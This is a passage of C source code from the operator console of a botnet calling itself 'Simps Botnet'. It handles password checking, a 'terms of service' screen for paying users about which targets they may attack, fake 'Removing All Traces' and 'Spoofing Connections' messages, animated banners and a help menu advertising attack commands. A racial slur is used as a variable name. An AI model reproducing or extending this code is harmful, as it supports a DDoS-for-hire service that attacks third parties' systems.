		goto end;

	trim(buf);
	if (strcmp(buf, accounts[find_line].password) != 0)
		goto failed;
	memset(buf, 0, 2048);

	/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

tos:
	memset(buf, 0, sizeof(buf));
	Title[datafd].login = 17;
	char loginz[5000];
	char login2[5000];
	char login3[5000];
	char login4[5000];
	char login5[5000];
	char login6[5000];
	char login7[5000];
	char login8[5000];
	char login9[5000];
	char logina[5000];
	char loginb[5000];
	char loginc[5000];
	char logind[5000];
	char logine[5000];
	char loginf[5000];
	char loging[5000];
	char loginh[5000];
	char logini[5000];
	char loginj[5000];
	char logink[5000];
	char loginl[5000];
	char tos[512];

	sprintf(loginz, "\e[31m                           ╔═════════════\e[95m═════════════╗\r\n");
	sprintf(login2, "\e[31m                           ║ [+] Terms Of\e[95m Service [+] ║\r\n");
	sprintf(login3, "\e[31m                ╔══════════╩═════════════\e[95m═════════════╩══════════╗\r\n");
	sprintf(login4, "\e[31m                ║---------------I Underst\e[95mand That:---------------║\r\n");
	sprintf(login5, "\e[31m                ║-Complaining & Dming Me \e[95mBullshit = Ban.         ║\r\n");
	sprintf(login6, "\e[31m                ║-Attacking Government We\e[95mbsites Are Prohibited.  ║\r\n");
	sprintf(login7, "\e[31m                ║-Attacking Dstates Are S\e[95mtrictly Prohibited.     ║\r\n");
	sprintf(login8, "\e[31m                ║-Bothering The Owners an\e[95md Admins Are Prohibited.║\r\n");
	sprintf(login9, "\e[31m                ║-Dming Admins & Owners A\e[95mnd Ask Stupid Questions.║\r\n");
	sprintf(logina, "\e[31m                ║-Asking For Deals And Re\e[95mfunds is Prohibited.    ║\r\n");
	sprintf(loginb, "\e[31m                ║-Everything I Attack Is \e[95mMy Own Responsibility.  ║\r\n");
	sprintf(loginc, "\e[31m                ║-Sharing Net Logins/Deta\e[95mils Is Prohibited.      ║\r\n");
	sprintf(logind, "\e[31m                ║-Spamming Attacks To The\e[95m Same Ip Is Prohibited. ║\r\n");
	sprintf(logine, "\e[31m                ║-Dont Complain If You Ge\e[95mt Banned With A Reason. ║\r\n");
	sprintf(loginf, "\e[31m                ║-If I Break Any One Of T\e[95mhese I Will Get Banned. ║\r\n");
	sprintf(loging, "\e[31m                ╚═════════╦══════════════\e[95m═════════════╦══════════╝\r\n");
	sprintf(loginh, "\e[31m                          ║ Do You Agree \e[95mTo Proceed ? ║\r\n");
	sprintf(logini, "\e[31m                          ╚══════════════\e[95m═════════════╝\r\n");
	sprintf(loginj, "\e[31m                                    ╔═══╗\e[95m╔═══╗\r\n");
	sprintf(logink, "\e[31m                                    ║ y ║\e[95m║ n ║\r\n");
	sprintf(loginl, "\e[31m                                    ╚═══╝\e[95m╚═══╝\r\n");
	sprintf(tos, "\e[31mSimps\e[95m@Tos\e[31m:\e[96m ");

	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, loginz, strlen(loginz), MSG_NOSIGNAL) == -1)
		goto end;
	memset(loginz, 0, sizeof(loginz));
	if (send(datafd, login2, strlen(login2), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login2, 0, sizeof(login2));
	if (send(datafd, login3, strlen(login3), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login3, 0, sizeof(login3));
	if (send(datafd, login4, strlen(login4), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login4, 0, sizeof(login4));
	if (send(datafd, login5, strlen(login5), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login5, 0, sizeof(login5));
	if (send(datafd, login6, strlen(login6), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login6, 0, sizeof(login6));
	if (send(datafd, login7, strlen(login7), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login7, 0, sizeof(login7));
	if (send(datafd, login8, strlen(login8), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login8, 0, sizeof(login8));
	if (send(datafd, login9, strlen(login9), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login9, 0, sizeof(login9));
	if (send(datafd, logina, strlen(logina), MSG_NOSIGNAL) == -1)
		goto end;
	memset(logina, 0, sizeof(logina));
	if (send(datafd, loginb, strlen(loginb), MSG_NOSIGNAL) == -1)
		goto end;
	memset(loginb, 0, sizeof(loginb));
	if (send(datafd, loginc, strlen(loginc), MSG_NOSIGNAL) == -1)
		goto end;
	memset(loginc, 0, sizeof(loginc));
	if (send(datafd, logind, strlen(logind), MSG_NOSIGNAL) == -1)
		goto end;
	memset(logind, 0, sizeof(logind));
	if (send(datafd, logine, strlen(logine), MSG_NOSIGNAL) == -1)
		goto end;
	memset(logine, 0, sizeof(logine));
	if (send(datafd, loginf, strlen(loginf), MSG_NOSIGNAL) == -1)
		goto end;
	memset(loginf, 0, sizeof(loginf));
	if (send(datafd, loging, strlen(loging), MSG_NOSIGNAL) == -1)
		goto end;
	memset(loging, 0, sizeof(loging));
	if (send(datafd, loginh, strlen(loginh), MSG_NOSIGNAL) == -1)
		goto end;
	memset(loginh, 0, sizeof(loginh));
	if (send(datafd, logini, strlen(logini), MSG_NOSIGNAL) == -1)
		goto end;
	memset(logini, 0, sizeof(logini));
	if (send(datafd, loginj, strlen(loginj), MSG_NOSIGNAL) == -1)
		goto end;
	memset(loginj, 0, sizeof(loginj));
	if (send(datafd, logink, strlen(logink), MSG_NOSIGNAL) == -1)
		goto end;
	memset(logink, 0, sizeof(logink));
	if (send(datafd, loginl, strlen(loginl), MSG_NOSIGNAL) == -1)
		goto end;
	memset(loginl, 0, sizeof(loginl));
	if (send(datafd, tos, strlen(tos), MSG_NOSIGNAL) == -1)
		goto end;
	if (fdgets(buf, sizeof buf, datafd) < 1)
		goto end;
	trim(buf);
	if (strcasestr(buf, "Y") || strcasestr(buf, "YES"))
	{
		FILE *LogFile;
		LogFile = fopen("Tos.log", "a");
		fprintf(LogFile, "%s: Has Agreed To Simps Tos.\r\n", accounts[find_line].username);
		fclose(LogFile);
		goto Auth;
	}
	else
	{
		sprintf(botnet, "\e[37mYou Did Not Accept Tos\e[31m!\r\n");
		if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
			goto end;
		memset(botnet, 0, sizeof(botnet));
		FILE *LogFile;
		LogFile = fopen("Tos.log", "a");
		fprintf(LogFile, "%s: Has Failed Simps Tos.\r\n", accounts[find_line].username);
		fclose(LogFile);
		sleep(3);
		goto end;
	}

	/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

Auth:
	Title[datafd].login = 16;
	char Authenticating1[5000];
	char Authenticating2[5000];
	char Authenticating3[5000];
	char Authenticating4[5000];
	char Authenticating5[5000];

	sprintf(Authenticating1, "\e[31m[\e[95m+\e[31m]\e[37m Auth\e[95m |\e[37m Removing All Traces\e[31m.\r\n");
	sprintf(Authenticating2, "\e[31m[\e[95m+\e[31m]\e[37m Auth\e[95m |\e[37m Spoofing Connections\e[31m.\r\n");
	sprintf(Authenticating3, "\e[31m[\e[95m+\e[31m]\e[37m Auth\e[95m |\e[37m Logging Agreements & Ip\e[31m.\r\n");
	sprintf(Authenticating4, "\e[31m[\e[95m+\e[31m]\e[37m Auth\e[95m |\e[37m Setting Up Simps Terminal\e[31m.\r\n");
	sprintf(Authenticating5, "\e[31m[\e[95m+\e[31m]\e[37m Auth\e[95m |\e[37m Successfully Authenticated Connection\e[31m.\r\n");

	if (send(datafd, Authenticating1, strlen(Authenticating1), MSG_NOSIGNAL) == -1)
		goto end;
	memset(Authenticating1, 0, sizeof(Authenticating1));
	usleep(250000);
	if (send(datafd, Authenticating2, strlen(Authenticating2), MSG_NOSIGNAL) == -1)
		goto end;
	memset(Authenticating2, 0, sizeof(Authenticating2));
	usleep(250000);
	if (send(datafd, Authenticating3, strlen(Authenticating3), MSG_NOSIGNAL) == -1)
		goto end;
	memset(Authenticating3, 0, sizeof(Authenticating3));
	usleep(250000);
	if (send(datafd, Authenticating4, strlen(Authenticating4), MSG_NOSIGNAL) == -1)
		goto end;
	memset(Authenticating4, 0, sizeof(Authenticating4));
	usleep(250000);
	if (send(datafd, Authenticating5, strlen(Authenticating5), MSG_NOSIGNAL) == -1)
		goto end;
	memset(Authenticating5, 0, sizeof(Authenticating5));
	usleep(250000);

	/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

Banner:
	SuccessfulLogin = 2;
	if (SuccessfulLogin == 2)
	{
		UsersConnected++;
	}
	strcpy(managements[datafd].username, accounts[find_line].username);
	strcpy(managements[datafd].password, accounts[find_line].password);
	strcpy(managements[datafd].id, accounts[find_line].id);
	managements[datafd].maxtime = accounts[find_line].maxtime;
	managements[datafd].cooldown = accounts[find_line].cooldown;
	strcpy(managements[datafd].expiry, accounts[find_line].expiry);
	FILE *LogFile;
	LogFile = fopen("SuccessfulLogin.log", "a");
	fprintf(LogFile, "%s: Has Successfully Logged In.\r\n", accounts[find_line].username);
	fclose(LogFile);
	UsersLogged++;
	sprintf(Title[datafd].string, accounts[find_line].expiry);
	Title[datafd].login = 2;
	char probanners1a[5000];
	char probanners2a[5000];
	char probanners3a[5000];
	char probanners4a[5000];
	char probanners5a[5000];
	char probanners6a[5000];
	char probanners7a[5000];
	char probanners8a[5000];
	char probanners9a[5000];
	char probanners1b[5000];
	char probanners2b[5000];
	char probanners3b[5000];
	char probanners4b[5000];
	char probanners5b[5000];
	char probanners6b[5000];
	char probanners7b[5000];
	char probannersbb[5000];
	char probanners8b[5000];
	char probanners9b[5000];
	char probanners1c[5000];
	char probanners2c[5000];
	char probanners3c[5000];
	char probanners4c[5000];
	char probanners5c[5000];
	char probanners6c[5000];
	char probanners7c[5000];
	char probanners8c[5000];
	char probanners9c[5000];
	char probanners1d[5000];
	char probanners2d[5000];
	char probanners3d[5000];
	char probanners4d[5000];
	char probanners5d[5000];
	char probanners6d[5000];
	char probanners7d[5000];
	char probanners8d[5000];
	char probanners9d[5000];
	char probanners1e[5000];
	char probanners2e[5000];
	char probanners3e[5000];
	char probanners4e[5000];
	char probanners5e[5000];
	char probanners6e[5000];
	char probanners7e[5000];
	char probanners8e[5000];
	char probanners9e[5000];
	char probanners1f[5000];
	char probanners2f[5000];
	char probanners3f[5000];
	char probanners4f[5000];
	char probanners5f[5000];
	char probanners6f[5000];
	char probanners7f[5000];
	char probanners8f[5000];
	char probanners9f[5000];
	char probanners1g[5000];
	char probanners2g[5000];
	char probanners3g[5000];
	char probanners4g[5000];
	char probanners5g[5000];
	char probanners6g[5000];
	char probanners1[5000];
	char probanners2[5000];
	char probanners3[5000];
	char probanners4[5000];
	char probanners5[5000];
	char probanners6[5000];
	char probanners7[5000];
	char probanners8[5000];
	char probanners9[5000];
	char probannersa[5000];
	char probannersb[5000];
	char probannersc[5000];
	char probannersd[5000];
	char probannerse[5000];
	char probannersf[5000];
	char bannerspace1[5000];
	char bannerspace2[5000];
	char bannerspace3[5000];
	char bannerspace4[5000];
	char bannerspace5[5000];
	char niggas[5000];

	sprintf(bannerspace1, "\e[31m\r\n");
	sprintf(probanners1a, "\e[31m                                  ╔═╗        \r\n");
	sprintf(probanners2a, "\e[31m                                  ╚═╗        \r\n");
	sprintf(probanners3a, "\e[31m                                  ╚═╝       \r\n");
	sprintf(probanners4a, "\e[31m                             \e[95m😈\e[31m We All Lo\e[95mve Girls\e[31m 😈  \r\n");
	sprintf(probanners5a, "\e[31m\r\n");
	sprintf(probanners6a, "\e[31m                ╔════════════════════════\e[95m═══════════════════════╗  \r\n");
	sprintf(probanners7a, "\e[31m                ║  Welcome To The Start S\e[95mcreen Of Simps Botnet  ║  \r\n");
	sprintf(probanners8a, "\e[31m                ║        Type \e[95m[\e[96mhelp\e[95m]\e[31m to s\e[95mee the Help Menu       ║  \r\n");
	sprintf(probanners9a, "\e[31m                ╚════════════════════════\e[95m═══════════════════════╝  \r\n");
	sprintf(probanners1b, "\e[31m                   ╔═════════════════════\e[95m═════════════════════╗ \r\n");
	sprintf(probanners2b, "\e[31m                   ║ Enjoy Simps Develope\e[95md And Ran By\e[31m:\e[96m @ur0a_ \e[95m║ \r\n");
	sprintf(probanners3b, "\e[31m                   ╚═════════════════════\e[95m═════════════════════╝ \r\n");
	sprintf(probanners4b, "\e[31m                    ╔════════════════════\e[95m════════════════════╗  \r\n");
	sprintf(probanners5b, "\e[31m                    ║   Connection Has Be\e[95men \e[31m(\e[96mESTABILISHED\e[31m)\e[95m   ║  \r\n");
	sprintf(probanners6b, "\e[31m                    ╚════════════════════\e[95m════════════════════╝  \r\n");

	sprintf(bannerspace2, "\e[31m\r\n");
	sprintf(probanners7b, "\e[31m                                  ╔═╗╦        \r\n");
	sprintf(probanners8b, "\e[31m                                  ╚═╗║        \r\n");
	sprintf(probanners9b, "\e[31m                                  ╚═╝╩        \r\n");
	sprintf(probanners1c, "\e[31m                             \e[95m😈\e[31m We All Lo\e[95mve Girls\e[31m 😈  \r\n");
	sprintf(probanners2c, "\e[31m\r\n");
	sprintf(probanners3c, "\e[31m                ╔════════════════════════\e[95m═══════════════════════╗  \r\n");
	sprintf(probanners4c, "\e[31m                ║  Welcome To The Start S\e[95mcreen Of Simps Botnet  ║  \r\n");
	sprintf(probanners5c, "\e[31m                ║        Type \e[95m[\e[96mhelp\e[95m]\e[31m to s\e[95mee the Help Menu       ║  \r\n");
	sprintf(probanners6c, "\e[31m                ╚════════════════════════\e[95m═══════════════════════╝  \r\n");
	sprintf(probanners7c, "\e[31m                   ╔═════════════════════\e[95m═════════════════════╗ \r\n");
	sprintf(probanners8c, "\e[31m                   ║ Enjoy Simps Develope\e[95md And Ran By\e[31m:\e[96m @ur0a_ \e[95m║ \r\n");
	sprintf(probanners9c, "\e[31m                   ╚═════════════════════\e[95m═════════════════════╝ \r\n");
	sprintf(probanners1d, "\e[31m                    ╔════════════════════\e[95m════════════════════╗  \r\n");
	sprintf(probanners2d, "\e[31m                    ║   Connection Has Be\e[95men \e[31m(\e[96mESTABILISHED\e[31m)\e[95m   ║  \r\n");
	sprintf(probanners3d, "\e[31m                    ╚════════════════════\e[95m════════════════════╝  \r\n");

	sprintf(bannerspace3, "\e[31m\r\n");
	sprintf(probanners4d, "\e[31m                                  ╔═╗╦╔╦╗\e[95m\r\n");
	sprintf(probanners5d, "\e[31m                                  ╚═╗║║║║\e[95m\r\n");
	sprintf(probanners6d, "\e[31m                                  ╚═╝╩╩ ╩\e[95m\r\n");
	sprintf(probanners7d, "\e[31m                             \e[95m😈\e[31m We All Lo\e[95mve Girls\e[31m 😈  \r\n");
	sprintf(probanners8d, "\e[31m\r\n");
	sprintf(probanners9d, "\e[31m                ╔════════════════════════\e[95m═══════════════════════╗  \r\n");
	sprintf(probanners1e, "\e[31m                ║  Welcome To The Start S\e[95mcreen Of Simps Botnet  ║  \r\n");
	sprintf(probanners2e, "\e[31m                ║        Type \e[95m[\e[96mhelp\e[95m]\e[31m to s\e[95mee the Help Menu       ║  \r\n");
	sprintf(probanners3e, "\e[31m                ╚════════════════════════\e[95m═══════════════════════╝  \r\n");
	sprintf(probanners4e, "\e[31m                   ╔═════════════════════\e[95m═════════════════════╗ \r\n");
	sprintf(probanners5e, "\e[31m                   ║ Enjoy Simps Develope\e[95md And Ran By\e[31m:\e[96m @ur0a_ \e[95m║ \r\n");
	sprintf(probanners6e, "\e[31m                   ╚═════════════════════\e[95m═════════════════════╝ \r\n");
	sprintf(probanners7e, "\e[31m                    ╔════════════════════\e[95m════════════════════╗  \r\n");
	sprintf(probanners8e, "\e[31m                    ║   Connection Has Be\e[95men \e[31m(\e[96mESTABILISHED\e[31m)\e[95m   ║  \r\n");
	sprintf(probanners9e, "\e[31m                    ╚════════════════════\e[95m════════════════════╝  \r\n");

	sprintf(bannerspace4, "\e[31m\r\n");
	sprintf(probanners1f, "\e[31m                                  ╔═╗╦╔╦╗\e[95m╔═╗\r\n");
	sprintf(probanners2f, "\e[31m                                  ╚═╗║║║║\e[95m╠═╝\r\n");
	sprintf(probanners3f, "\e[31m                                  ╚═╝╩╩ ╩\e[95m╩  \r\n");
	sprintf(probanners4f, "\e[31m                             \e[95m😈\e[31m We All Lo\e[95mve Girls\e[31m 😈  \r\n");
	sprintf(probanners5f, "\e[31m\r\n");
	sprintf(probanners6f, "\e[31m                ╔════════════════════════\e[95m═══════════════════════╗  \r\n");
	sprintf(probanners7f, "\e[31m                ║  Welcome To The Start S\e[95mcreen Of Simps Botnet  ║  \r\n");
	sprintf(probanners8f, "\e[31m                ║        Type \e[95m[\e[96mhelp\e[95m]\e[31m to s\e[95mee the Help Menu       ║  \r\n");
	sprintf(probanners9f, "\e[31m                ╚════════════════════════\e[95m═══════════════════════╝  \r\n");
	sprintf(probanners1g, "\e[31m                   ╔═════════════════════\e[95m═════════════════════╗ \r\n");
	sprintf(probanners2g, "\e[31m                   ║ Enjoy Simps Develope\e[95md And Ran By\e[31m:\e[96m @ur0a_ \e[95m║ \r\n");
	sprintf(probanners3g, "\e[31m                   ╚═════════════════════\e[95m═════════════════════╝ \r\n");
	sprintf(probanners4g, "\e[31m                    ╔════════════════════\e[95m════════════════════╗  \r\n");
	sprintf(probanners5g, "\e[31m                    ║   Connection Has Be\e[95men \e[31m(\e[96mESTABILISHED\e[31m)\e[95m   ║  \r\n");
	sprintf(probanners6g, "\e[31m                    ╚════════════════════\e[95m════════════════════╝  \r\n");

	sprintf(bannerspace5, "\e[31m\r\n");
	sprintf(probanners1, "\e[31m                                  ╔═╗╦╔╦╗\e[95m╔═╗╔═╗        \r\n");
	sprintf(probanners2, "\e[31m                                  ╚═╗║║║║\e[95m╠═╝╚═╗        \r\n");
	sprintf(probanners3, "\e[31m                                  ╚═╝╩╩ ╩\e[95m╩  ╚═╝        \r\n");
	sprintf(probanners4, "\e[31m                             \e[95m😈\e[31m We All Lo\e[95mve Girls\e[31m 😈  \r\n");
	sprintf(probanners5, "\e[31m\r\n");
	sprintf(probanners6, "\e[31m                ╔════════════════════════\e[95m═══════════════════════╗  \r\n");
	sprintf(probanners7, "\e[31m                ║  Welcome To The Start S\e[95mcreen Of Simps Botnet  ║  \r\n");
	sprintf(probanners8, "\e[31m                ║        Type \e[95m[\e[96mhelp\e[95m]\e[31m to s\e[95mee the Help Menu       ║  \r\n");
	sprintf(probanners9, "\e[31m                ╚════════════════════════\e[95m═══════════════════════╝  \r\n");
	sprintf(probannersa, "\e[31m                   ╔═════════════════════\e[95m═════════════════════╗ \r\n");
	sprintf(probannersb, "\e[31m                   ║ Enjoy Simps Develope\e[95md And Ran By\e[31m:\e[96m @ur0a_ \e[95m║ \r\n");
	sprintf(probannersc, "\e[31m                   ╚═════════════════════\e[95m═════════════════════╝ \r\n");
	sprintf(probannersd, "\e[31m                    ╔════════════════════\e[95m════════════════════╗  \r\n");
	sprintf(probannerse, "\e[31m                    ║   Connection Has Be\e[95men \e[31m(\e[96mESTABILISHED\e[31m)\e[95m   ║  \r\n");
	sprintf(probannersf, "\e[31m                    ╚════════════════════\e[95m════════════════════╝  \r\n");

	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, bannerspace1, strlen(bannerspace1), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners1a, strlen(probanners1a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners2a, strlen(probanners2a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners3a, strlen(probanners3a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners4a, strlen(probanners4a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners5a, strlen(probanners5a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners6a, strlen(probanners6a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners7a, strlen(probanners7a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners8a, strlen(probanners8a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners9a, strlen(probanners9a), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners1b, strlen(probanners1b), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners2b, strlen(probanners2b), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners3b, strlen(probanners3b), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners4b, strlen(probanners4b), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners5b, strlen(probanners5b), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners6b, strlen(probanners6b), MSG_NOSIGNAL) == -1)
		goto end;
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, bannerspace2, strlen(bannerspace2), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners7b, strlen(probanners7b), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners8b, strlen(probanners8b), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners9b, strlen(probanners9b), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners1c, strlen(probanners1c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners2c, strlen(probanners2c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners3c, strlen(probanners3c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners4c, strlen(probanners4c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners5c, strlen(probanners5c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners6c, strlen(probanners6c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners7c, strlen(probanners7c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners8c, strlen(probanners8c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners9c, strlen(probanners9c), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners1d, strlen(probanners1d), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners2d, strlen(probanners2d), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners3d, strlen(probanners3d), MSG_NOSIGNAL) == -1)
		goto end;
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, bannerspace3, strlen(bannerspace3), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners4d, strlen(probanners4d), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners5d, strlen(probanners5d), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners6d, strlen(probanners6d), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners7d, strlen(probanners7d), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners8d, strlen(probanners8d), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners9d, strlen(probanners9d), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners1e, strlen(probanners1e), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners2e, strlen(probanners2e), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners3e, strlen(probanners3e), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners4e, strlen(probanners4e), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners5e, strlen(probanners5e), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners6e, strlen(probanners6e), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners7e, strlen(probanners7e), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners8e, strlen(probanners8e), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners9e, strlen(probanners9e), MSG_NOSIGNAL) == -1)
		goto end;
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, bannerspace4, strlen(bannerspace4), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners1f, strlen(probanners1f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners2f, strlen(probanners2f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners3f, strlen(probanners3f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners4f, strlen(probanners4f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners5f, strlen(probanners5f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners6f, strlen(probanners6f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners7f, strlen(probanners7f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners8f, strlen(probanners8f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners9f, strlen(probanners9f), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners1g, strlen(probanners1g), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners2g, strlen(probanners2g), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners3g, strlen(probanners3g), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners4g, strlen(probanners4g), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners5g, strlen(probanners5g), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners6g, strlen(probanners6g), MSG_NOSIGNAL) == -1)
		goto end;
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (motdlol != 0)
	{
		if (strlen(motd) > 1)
			if (send(datafd, niggas, strlen(niggas), MSG_NOSIGNAL) == -1)
				goto end;
		memset(niggas, 0, sizeof(niggas));
	}
	if (send(datafd, bannerspace5, strlen(bannerspace5), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners1, strlen(probanners1), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners2, strlen(probanners2), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners3, strlen(probanners3), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners4, strlen(probanners4), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners5, strlen(probanners5), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners6, strlen(probanners6), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners7, strlen(probanners7), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners8, strlen(probanners8), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probanners9, strlen(probanners9), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probannersa, strlen(probannersa), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probannersb, strlen(probannersb), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probannersc, strlen(probannersc), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probannersd, strlen(probannersd), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probannerse, strlen(probannerse), MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, probannersf, strlen(probannersf), MSG_NOSIGNAL) == -1)
		goto end;
	goto WhileEnd;

	/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

	while (fdgets(buf, sizeof buf, datafd) > 0)
	{
		if (strcasestr(buf, "HELP") || strcasestr(buf, "?") || strcasestr(buf, "COMMANDS"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 3;
			char idk1[5000];
			char idk2[5000];
			char idk3[5000];
			char idk4[5000];
			char idk5[5000];
			char idk6[5000];
			char idk7[5000];
			char idk8[5000];
			char idk9[5000];
			char idka[5000];
			char idkb[5000];
			char idkc[5000];
			char idkd[5000];
			char idke[5000];
			char idkf[5000];
			char idkg[5000];
			char idkh[5000];
			char idki[5000];
			char idkj[5000];

			sprintf(idk1, "\e[31m         ╔════════\e[95m════════╗                  \r\n");
			sprintf(idk2, "\e[31m         ║  \e[95m[\e[96m+\e[95m]\e[31m He\e[95mlp \e[31m[\e[96m+\e[31m]\e[95m  ║                  \r\n");
			sprintf(idk3, "\e[31m╔════════╩════════\e[95m════════╩═════════╗         \r\n");
			sprintf(idk4, "\e[31m║ Methods \e[95m>\e[31m Shows \e[95mAttack Commands   ║ \r\n");
			sprintf(idk5, "\e[31m║ Rules   \e[95m>\e[31m Shows \e[95mBotnet Rules      ║ \r\n");
			sprintf(idk6, "\e[31m║ Bots    \e[95m>\e[31m Shows \e[95mNet Bots          ║ \r\n");
			sprintf(idk7, "\e[31m║ Stats   \e[95m>\e[31m Shows \e[95mNet Status        ║ \r\n");
			sprintf(idk8, "\e[31m║ Ports   \e[95m>\e[31m Shows \e[95mComman Ports      ║ \r\n");
			sprintf(idk9, "\e[31m║ Credit  \e[95m>\e[31m Shows \e[95mWho Made Simps    ║ \r\n");
			sprintf(idka, "\e[31m║ Contact \e[95m>\e[31m Shows \e[95mContact Methods   ║ \r\n");
			sprintf(idkb, "\e[31m║ Logout  \e[95m>\e[31m Logs  \e[95mYou Out           ║ \r\n");
			sprintf(idkc, "\e[31m║ Ctypes  \e[95m>\e[31m Shows \e[95mClear Commands    ║ \r\n");
			sprintf(idkd, "\e[31m║ Tos     \e[95m>\e[31m Shows \e[95mTerms Of Services ║ \r\n");
